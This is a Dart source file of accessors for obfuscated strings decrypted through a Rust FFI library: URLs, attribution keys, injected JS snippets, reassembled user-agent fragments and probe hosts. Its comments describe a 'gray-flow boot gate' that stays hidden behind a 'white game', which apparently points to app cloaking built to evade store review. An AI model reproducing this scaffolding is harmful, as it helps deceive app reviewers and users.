// Typed accessors for every sealed string shipped in librust_guard.
//
// IDs must stay in sync with `rust/build.rs`. Dart never embeds a plaintext
// copy — every call goes through Rust.

import 'rust_guard.dart';

/// Numeric ids match `rust/build.rs`.
abstract final class SealedIds {
  // ── core ────────────────────────────────────────────────────────
  static const privacyUrl   = 1;
  static const supportUrl   = 2;
  static const defaultUa    = 3;
  static const edgeEndpoint = 4;
  static const fieldSchema  = 5;
  static const fieldNonce   = 6;
  static const fieldPayload = 7;
  static const fieldTag     = 8;
  static const schemaRev    = 9;
  // 10 is the HMAC/keystream secret — intentionally not exposed to Dart;
  //    it is consumed only inside `rg_pack`.
  static const bundleId     = 11;
  static const appName      = 12;

  // ── attribution + messaging ─────────────────────────────────────
  static const afDevKey     = 20;
  static const fbProjectNum = 21;
  static const afGcdBase    = 22;
  static const onelinkHost  = 23;

  // ── js payloads ─────────────────────────────────────────────────
  static const jsSafeArea   = 24;
  static const jsKbdScroll  = 25;
  static const jsInlinePlay = 26;

  // ── UA fragments (BrowserMarker reassembles) ────────────────────
  static const uaProduct    = 30;
  static const uaPlatOpen   = 31;
  static const uaBuildTag   = 32;
  static const uaPlatClose  = 33;
  static const uaEngineLbl  = 34;
  static const uaEngineTail = 35;
  static const uaChromeLbl  = 36;
  static const uaMobileLbl  = 37;
  static const uaChromeVer  = 38;
  static const uaWebkitVer  = 39;
  static const uaAppIdKey   = 40;
  static const uaAppNameKey = 41;
  static const uaAppNamePas = 42;

  // ── reach probe hosts ───────────────────────────────────────────
  static const reachHostA   = 50;
  static const reachHostB   = 51;
}

/// Thin facade over [RustGuard.fetchString] so callers don't take a direct
/// dependency on the raw FFI handle.
abstract final class Sealed {
  static String _s(int id) => RustGuard.instance.fetchString(id);

  static String get privacyUrl   => _s(SealedIds.privacyUrl);
  static String get supportUrl   => _s(SealedIds.supportUrl);
  static String get defaultUa    => _s(SealedIds.defaultUa);
  static String get edgeEndpoint => _s(SealedIds.edgeEndpoint);
  static String get bundleId     => _s(SealedIds.bundleId);
  static String get appName      => _s(SealedIds.appName);

  static String get afDevKey     => _s(SealedIds.afDevKey);
  static String get fbProjectNum => _s(SealedIds.fbProjectNum);
  static String get afGcdBase    => _s(SealedIds.afGcdBase);
  static String get onelinkHost  => _s(SealedIds.onelinkHost);

  static String get jsSafeArea   => _s(SealedIds.jsSafeArea);
  static String get jsKbdScroll  => _s(SealedIds.jsKbdScroll);
  static String get jsInlinePlay => _s(SealedIds.jsInlinePlay);

  static String get reachHostA   => _s(SealedIds.reachHostA);
  static String get reachHostB   => _s(SealedIds.reachHostB);

  /// Reads a UA fragment by id. BrowserMarker uses this to reassemble.
  static String ua(int id) => _s(id);
}

/// Returns true once librust_guard loaded and self-checked. If this is false
/// the app refuses to show menus that depend on sealed URLs — rather than
/// silently sending users to about:blank.
bool get guardReady {
  try {
    return RustGuard.instance.fetchString(SealedIds.privacyUrl).isNotEmpty;
  } catch (_) {
    return false;
  }
}

/// True only when operator-provided credentials are present. While false, the
/// gray-flow boot gate stays dormant and every launch lands in the white
/// game.
bool get credentialsReady {
  try {
    final af = RustGuard.instance.fetchString(SealedIds.afDevKey);
    final fb = RustGuard.instance.fetchString(SealedIds.fbProjectNum);
    return af.length >= 16 && fb.length >= 6;
  } catch (_) {
    return false;
  }
}
